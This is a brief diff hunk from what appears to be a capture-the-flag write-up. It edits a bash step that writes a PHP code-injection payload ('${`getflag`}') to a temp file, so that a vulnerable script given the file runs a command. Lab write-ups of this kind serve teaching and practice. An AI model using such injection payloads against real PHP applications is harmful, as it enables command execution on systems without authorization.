@@ -43,7 +43,7 @@
 
     We create a malicious script that injects PHP code:
     ```bash
-    echo '[x {${system(getflag)}}]' > /tmp/exploit
+    echo '[x ${`getflag`}]' > /tmp/exploit
     ```
     Pass the file as an argument to the script:
     ```bash
